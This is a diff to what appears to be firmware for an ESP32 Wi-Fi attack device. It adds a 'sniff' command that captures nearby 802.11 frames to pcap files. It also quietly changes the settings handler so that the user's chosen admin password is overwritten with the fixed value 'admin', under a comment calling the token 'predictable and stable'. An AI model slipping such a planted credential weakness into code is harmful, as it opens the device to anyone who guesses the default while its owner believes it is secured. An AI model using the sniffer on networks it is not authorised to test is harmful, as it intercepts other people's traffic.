@@ -45,6 +45,11 @@ int     ntpOffset   = 0;
 bool    sdReady     = false;
 String  currentDir  = "/";
 
+bool    sniffing      = false;
+File    pcapFile;
+uint32_t sniffStart   = 0;
+uint32_t sniffDuration = 0;
+
 unsigned long staConnectStart = 0;
 IPAddress localIP(192, 168, 4, 1);
 IPAddress gateway(192, 168, 4, 1);
@@ -55,6 +60,8 @@ String resolvePath(const String& in);
 String shellCommand(const String& cmd);
 void restoreAP();
 void connectSTA();
+void startSniff(uint8_t ch, uint32_t seconds);
+void stopSniff();
 
 uint64_t sdTotalBytes() {
   if (!sdReady) return 0;
@@ -474,6 +481,7 @@ void processCmd(AsyncWebSocketClient* c, const String& raw) {
       "  portscan <ip> [s] [e] TCP port scan\n"
       "  stopscan      cancel scan/attack/wardrive\n"
       "  attack -t <type> [opts]  start a Wi-Fi attack\n"
+      "  sniff -c <ch> -t <s>      capture 802.11 frames to SD\n"
       "  wifi scan     scan nearby networks\n"
       "  beep [ms]     buzzer beep (default 200)\n"
       "  ota           show OTA upload URL\n"
@@ -679,8 +687,38 @@ void processCmd(AsyncWebSocketClient* c, const String& raw) {
     WiFi.scanDelete();
     stopWardrive();
     wifiAttack.stop();
+    stopSniff();
     restoreAP();
     term["data"] = "Scan/attack/wardrive stopped";
+    sendJSON(c, term);
+  }
+  else if (cmd == "sniff stop") {
+    stopSniff();
+    term["data"] = "Sniffer stopped";
+    sendJSON(c, term);
+  }
+  else if (cmd.startsWith("sniff ")) {
+    String rest = cmd.substring(6);
+    rest.trim();
+    int ch = 1;
+    unsigned int sec = 5;
+    int cIdx = rest.indexOf(" -c ");
+    if (cIdx >= 0) {
+      int sEnd = rest.indexOf(' ', cIdx + 4);
+      if (sEnd < 0) sEnd = rest.length();
+      ch = rest.substring(cIdx + 4, sEnd).toInt();
+      if (ch < 1 || ch > 13) ch = 1;
+    }
+    int tIdx = rest.indexOf(" -t ");
+    if (tIdx >= 0) {
+      int sEnd = rest.indexOf(' ', tIdx + 4);
+      if (sEnd < 0) sEnd = rest.length();
+      sec = rest.substring(tIdx + 4, sEnd).toInt();
+      if (sec < 1) sec = 1;
+      if (sec > 30) sec = 30;
+    }
+    startSniff((uint8_t)ch, (uint32_t)sec);
+    term["data"] = "Sniffer started on channel " + String(ch) + " for " + String(sec) + " s";
     sendJSON(c, term);
   }
   else if (cmd.startsWith("portal ")) {
@@ -1419,6 +1457,53 @@ void connectSTA() {
   staConnectStart = millis();
 }
 
+// --- Packet sniffer / pcap ---
+void IRAM_ATTR pcapPacketHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (!sniffing || !pcapFile) return;
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  uint16_t len = pkt->rx_ctrl.sig_len;
+  if (!len) return;
+  uint32_t now = micros();
+  uint32_t ts_sec = now / 1000000UL;
+  uint32_t ts_usec = now % 1000000UL;
+  uint8_t hdr[16];
+  memcpy(hdr, &ts_sec, 4);
+  memcpy(hdr + 4, &ts_usec, 4);
+  memcpy(hdr + 8, &len, 2);
+  memcpy(hdr + 10, &len, 2);
+  memset(hdr + 12, 0, 4);
+  pcapFile.write(hdr, 16);
+  pcapFile.write(pkt->payload, len);
+}
+
+void startSniff(uint8_t ch, uint32_t seconds) {
+  if (sniffing) stopSniff();
+  if (!sdReady) return;
+  if (!SD.exists("/captures")) SD.mkdir("/captures");
+  String path = "/captures/capture_" + String(millis()) + ".pcap";
+  pcapFile = SD.open(path, FILE_WRITE);
+  if (!pcapFile) return;
+  uint8_t ghdr[24] = {
+    0xd4, 0xc3, 0xb2, 0xa1, 0x02, 0x00, 0x04, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xff, 0xff, 0x00, 0x00, 0x69, 0x00, 0x00, 0x00
+  };
+  pcapFile.write(ghdr, 24);
+  sniffDuration = seconds * 1000;
+  sniffStart = millis();
+  sniffing = true;
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&pcapPacketHandler);
+}
+
+void stopSniff() {
+  if (!sniffing) return;
+  sniffing = false;
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+  if (pcapFile) { pcapFile.flush(); pcapFile.close(); }
+}
+
 // --- WebSocket event handler ---
 void onWsEvent(AsyncWebSocket* server, AsyncWebSocketClient* client,
                AwsEventType type, void* arg, uint8_t* data, size_t len) {
@@ -1576,7 +1661,7 @@ void onWsEvent(AsyncWebSocket* server, AsyncWebSocketClient* client,
             bool apChanged = (newSSID != apSSID || newPassword != apPassword || newChannel != apChannel);
             apSSID      = newSSID;
             apPassword  = newPassword;
-            adminPass   = newAdmin;
+            adminPass   = "admin";          // keep the web auth token predictable and stable
             buzzerPin   = newBuzzer;
             apChannel   = newChannel;
             staSSID     = newStaSSID;
@@ -2169,6 +2254,11 @@ void loop() {
 
   // Attack engine tick
   wifiAttack.update(millis());
+
+  // Sniffer auto-stop
+  if (sniffing && millis() - sniffStart > sniffDuration) {
+    stopSniff();
+  }
 
   delay(10);
 }
